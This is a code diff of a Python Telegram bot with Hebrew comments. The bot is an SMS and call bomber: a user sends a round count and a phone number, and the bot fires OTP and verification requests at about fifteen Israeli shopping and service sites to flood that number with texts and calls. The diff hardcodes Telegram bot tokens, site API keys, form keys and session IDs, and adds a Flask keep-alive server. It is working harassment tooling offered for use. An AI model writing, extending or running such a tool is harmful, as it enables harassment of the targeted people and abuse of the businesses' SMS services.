@@ -5,7 +5,7 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- שרת Flask לשמירה על הבוט פעיל ב-Render ---
+# --- שרת Flask לשמירה על הבוט פעיל ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Online"
@@ -14,31 +14,15 @@ def keep_alive():
     t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
     t.start()
 
-# --- הגדרת הבוט עם הטוקן המעודכן ---
-API_TOKEN = '8620606926:AAFYojGPF-_ex76iTJtVEbgZaVvj1Tu2ivA'
+# --- הגדרת הבוט עם הטוקן החדש ---
+API_TOKEN = '8788411826:AAHei0-plqCO3X-KDrhEO05PHb5NSf7bLr4'
 bot = telebot.TeleBot(API_TOKEN)
 
 def attack(m, target, rounds):
-    # התאמת מספר עם מקף עבור ה-API של משלוחה
-    target_dashed = f"{target[:3]}-{target[3:]}"
-    
-    # רשימת ה-17 המנצחת (SMS + שיחות)
+    # רשימת ה-15 הכוללת את משלוחה והאתרים היציבים
     apis = [
-        # --- משלוחה: שיחה קולית ---
-        {
-            "n": "Mishloha Call", 
-            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
-            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": True, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
-            "type": "json"
-        },
-        # --- משלוחה: SMS ---
-        {
-            "n": "Mishloha SMS", 
-            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
-            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": False, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
-            "type": "json"
-        },
         {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
+        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json"},
         {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
         {"n": "Onot", "u": "https://www.onot.co.il/customer/ajax/post/", "d": {"form_key": "cis1GHI1WxfdOMSR", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
         {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "9c47a6a0-db2f-4be6-a45d-5b8548fd11c2"}, "type": "json"},
@@ -51,37 +35,26 @@ def attack(m, target, rounds):
         {"n": "Delta", "u": "https://www.delta.co.il/customer/ajax/post/", "d": {"form_key": "vmG08wd94ASHHMPp", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
         {"n": "Step In", "u": "https://www.stepin.co.il/customer/ajax/post/", "d": {"form_key": "jzm8zMmOseKijwBO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
         {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"},
-        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "8baff678-a092-4f3e-b08d-26adf214696b"}, "type": "json"},
         {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}, "type": "json"}
     ]
     
-    headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
-    total_success, total_fail = 0, 0
-
+    headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15", "X-Requested-With": "XMLHttpRequest"}
+    
     for r in range(int(rounds)):
-        round_success, round_fail = 0, 0
+        success = 0
         for site in apis:
             try:
                 if site["type"] == "json":
-                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=6)
+                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
                 else:
-                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=6)
-                
-                if res.status_code in [200, 201]: round_success += 1
-                else: round_fail += 1
-            except: round_fail += 1
-            
-            # דיליי מהיר של 0.1 שניות בין אתרים
-            time.sleep(0.1)
+                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
+                if res.status_code in [200, 201]: success += 1
+            except: pass
+            time.sleep(0.1) # דיליי 0.1 שניות
         
-        total_success += round_success
-        total_fail += round_fail
-        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {round_success} | ❌ נכשלו: {round_fail}")
-        
+        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם! הצלחות: {success}/{len(apis)}")
         if r < int(rounds) - 1:
-            time.sleep(1.5) # הפסקה קלה בין סבבים
-
-    bot.send_message(m.chat.id, f"🏁 **הפצצה הושלמה!**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")
+            time.sleep(1.2)
 
 @bot.message_handler(func=lambda m: True)
 def handle(m):
@@ -89,16 +62,11 @@ def handle(m):
         parts = m.text.split()
         if len(parts) == 2:
             rounds, target = parts[0], parts[1]
-            if rounds.isdigit() and target.isdigit() and len(target) >= 9:
-                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים של SMS ושיחות על {target}...\n(17 פעולות בכל סבב!)")
+            if rounds.isdigit() and target.isdigit():
+                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים על {target}...")
                 attack(m, target, rounds)
-            else:
-                bot.reply_to(m, "פורמט: [סבבים] [מספר]")
-        else:
-            bot.reply_to(m, "לדוגמה: 2 0521234567")
-    except:
-        bot.reply_to(m, "שגיאה בביצוע הפעולה.")
+    except: pass
 
 if __name__ == "__main__":
     keep_alive()
-    bot.infinity_polling()
+    bot.infinity_polling(non_stop=True)
